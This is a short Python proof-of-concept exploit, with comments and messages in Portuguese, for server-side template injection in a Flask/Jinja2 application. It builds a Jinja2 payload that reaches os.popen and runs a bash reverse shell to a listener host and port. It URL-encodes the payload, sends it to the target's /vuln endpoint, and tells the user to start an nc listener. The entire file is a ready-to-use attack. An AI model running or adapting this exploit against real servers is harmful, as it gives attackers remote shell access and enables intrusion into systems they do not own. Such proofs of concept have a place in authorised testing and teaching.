#!/usr/bin/python3
import socket
import sys
import requests
import argparse
from urllib.parse import quote_plus

def create_payload(lhost, lport):
    rev_shell_cmd = f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
    
    payload = f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{rev_shell_cmd}').read() }}}}"
    
    print(f"[*] Payload SSTI criado com sucesso.")
    return payload

def run_exploit(rhost, rport, payload):
    encoded_payload = quote_plus(payload)
    
    target_url = f"http://{rhost}:{rport}/vuln?name={encoded_payload}"
    
    print(f"[*] URL de ataque montada em:\n    {target_url}")
    
    try:
        print("[*] Enviando o exploit...")
        requests.get(target_url, timeout=5, allow_redirects=False)
        
    except requests.exceptions.ReadTimeout:
        print("[+] Payload enviado! Verifique o litener.")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Falha ao conectar: {e}")
    except Exception as e:
        print(f"[-] Erro inesperado: {e}")

def main():
    parser = argparse.ArgumentParser(description="Exploit de uma PoC para SSTI em Flask/Jinja2")
    parser.add_argument("rhost", help="O IP do alvo ")
    parser.add_argument("rport", help="A porta do alvo ")
    parser.add_argument("lhost", help="O IP do seu listener ")
    parser.add_argument("lport", help="A porta do seu listener ")
    
    args = parser.parse_args()

    payload = create_payload(args.lhost, args.lport)
    
    print("--- SSTI Exploit ---")
    print(f"[*] Alvo:    {args.rhost}:{args.rport}")
    print(f"[*] Listener: {args.lhost}:{args.lport}")
    print(f"[*] Verifique se seu listener 'nc -nlvp {args.lport}' est√° rodando.")
    input("[*] Pressione <Enter> para enviar o exploit...")
    
    run_exploit(args.rhost, args.rport, payload)

if __name__ == "__main__":
    main()
